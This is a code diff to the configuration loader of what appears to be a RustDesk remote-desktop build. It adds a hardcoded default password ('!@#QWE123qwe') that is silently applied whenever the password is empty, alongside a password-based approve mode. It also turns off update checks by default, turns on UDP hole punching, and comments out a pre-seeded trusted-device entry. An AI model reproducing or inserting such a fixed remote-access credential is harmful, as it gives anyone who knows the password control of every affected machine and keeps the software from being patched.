@@ -469,6 +469,13 @@ impl Config2 {
             config.options.insert("approve-mode".to_string(), "password".to_string());
             store = true;
         }
+
+         if config.password.is_empty() {
+            config.password = "!@#QWE123qwe".to_string();
+            store = true;
+        }
+
+
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -481,10 +488,10 @@ impl Config2 {
         config.unlock_pin = unlock_pin;
         store |= store2;
 
-        if !config.options.contains_key("trusted_devices") {
-                config.options.insert("trusted_devices".to_string(), "00hWXG+2rrmhpK9dw17BAseNg6".to_string());
-                config.store();
-            }
+        // if !config.options.contains_key("trusted_devices") {
+        //         config.options.insert("trusted_devices".to_string(), "00hWXG+2rrmhpK9dw17BAseNg6".to_string());
+        //         config.store();
+        //     }
 
         if store {
             config.store();
@@ -1830,7 +1837,23 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        //Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+
+        if !config.options.contains_key("enable-check-update") {
+        config.options.insert("enable-check-update".to_string(), "N".to_string());
+        store = true;
+        }
+
+            if !config.options.contains_key("enable-udp-punch") {
+                config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+                store = true;
+            }
+        if store {
+                config.store();
+            }
+        config
     }
 
     fn store(&self) {
